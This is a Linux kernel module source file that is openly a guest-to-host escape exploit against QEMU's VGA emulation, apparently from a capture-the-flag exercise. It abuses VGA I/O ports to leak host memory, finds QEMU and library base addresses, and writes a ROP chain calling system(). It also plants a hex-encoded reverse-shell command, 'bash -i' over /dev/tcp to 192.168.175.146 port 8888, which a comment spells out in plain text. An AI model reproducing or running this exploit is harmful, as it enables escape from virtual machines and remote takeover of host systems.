#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <asm/io.h>
#include <linux/slab.h>
#include <linux/netdevice.h>
#include <linux/mii.h>
#include <linux/highmem.h>

//void get_random_bytes(void* p,int size);
#define MEM_BASE 0xa0000
char* lpbase ;

int read1int(addr){
  int ret=0;
  outb(4,0x3ce);
  outb(0,0x3cf);
  ret=readb(lpbase+addr);
  outb(4,0x3ce);
  outb(1,0x3cf);
  ret|=(readb(lpbase+addr)<<8);
  outb(4,0x3ce);
  outb(2,0x3cf);
  ret|=(readb(lpbase+addr)<<16);
  outb(4,0x3ce);
  outb(3,0x3cf);
  ret|=(readb(lpbase+addr)<<24);
  return ret;
}

void setBankoff(int bkoff){
  outw(0x5,0x1ce);//set bank_offset to 0xff0000
  outw(bkoff,0x1cf);
}

void write1int(int val,int addr){
  outb(0x2,0x3c4);// set write mask 0xffffff
  outb(0x1,0x3c5);
  writeb(val&0xff,addr+lpbase);
  outb(0x2,0x3c4);// set write mask 0xffffff
  outb(0x2,0x3c5);
  writeb((val>>8)&0xff,addr+lpbase);
  outb(0x2,0x3c4);// set write mask 0xffffff
  outb(0x4,0x3c5);
  writeb((val>>16)&0xff,addr+lpbase);
  outb(0x2,0x3c4);// set write mask 0xffffff
  outb(0x8,0x3c5);
  writeb((val>>24)&0xff,addr+lpbase);
}

//a='bash -i &>/dev/tcp/192.168.175.146/8888 0>&1'
/*
def str2hex(string):
  for i in range(len(string)/4):
    a=string[i*4:i*4+4]
    b=a[::-1]
    print '0x'+b.encode('hex')
*/
void shell(int addr){
  write1int(0x68736162,addr+0);
  write1int(0x20692d20,addr+1);
  write1int(0x642f3e26,addr+2);
  write1int(0x742f7665,addr+3);
  write1int(0x312f7063,addr+4);
  write1int(0x312e3239,addr+5);
  write1int(0x312e3836,addr+6);
  write1int(0x312e3537,addr+7);
  write1int(0x382f3634,addr+8);
  write1int(0x20383838,addr+9);
  write1int(0x31263e30,addr+10);
  write1int(         0,addr+0x11);
}

void rop(int addr,int bk,int low,int high,int straddrlow){
  write1int(low+0x555884,addr);// pop rax;retq
  write1int(high,addr+1);
  write1int(low+0xad8848,addr+2);// got@system
  write1int(high,addr+3);
  write1int(low+0x3106d6,addr+4);// pop rdi;ret
  write1int(high,addr+5);
  write1int(straddrlow,addr+6);// pstring
  write1int(high,addr+7);
  write1int(low+0x32dac8,addr+8);// call [rax]
  write1int(high,addr+9);
  shell(addr+18);
}



static int exploit_init(void){
  int addr;
  outb(0x6,0x3ce);//change mode to 2,make addr<0x10000 is possible
  outb(0x9,0x3cf);

  outb(0x2,0x3c4);//disable memory access update
  outb(0x0,0x3c5);

  outb(0x04,0x3c4);//pass the first if,disable second condition
  outb(0x0,0x3c5);

  outb(0x6,0x3ce);//change mode to 1
  outb(0x5,0x3cf);
  
  int bk=0xcd;
  setBankoff(bk++);

  outb(0x05,0x3ce);//pass the second if
  outb(0x0,0x3cf);

  addr=0x5400;
  lpbase =ioremap(MEM_BASE,0x20000);
  int off=0;
  int val=0;
  while(1){ // find elf magic header
    if(addr==0x10000){
      setBankoff(bk++);
      addr=0;
    }
    if(read1int(addr++)==0x464c457f)
      break;
  }

  int liboff=--addr; //the byte offset of my libdl
  int libbk=--bk;

  if(liboff-(0x1100-0x50)/4<0){//代表addr小于0x10000,需要退位
    printk("back!\n");
    setBankoff(--libbk);//退位
    addr=liboff-(0x1100-0x50)/4+0x10000;
  }else
    addr=liboff-(0x1100-0x50)/4;
  printk("lib_off:%x,%x\n",libbk,addr);
  int straddrlow=read1int(addr);// get stack addr to put string
  int addrhigh=read1int(addr+1);
  printk("stack_base:%x,%x\n",addrhigh,straddrlow);

  addr=liboff-(0x1100)/4+0x2e;
  int addrlow=read1int(addr)-0x66187b;
  printk("qemu_base:%x,%x\n",addrhigh,addrlow);
  rop(addr,libbk,addrlow,addrhigh,straddrlow);
  return 0;
}
static void exploit_exit(void){
  printk(KERN_ALERT "See You Again!my master\n");
}
module_init(exploit_init);
module_exit(exploit_exit);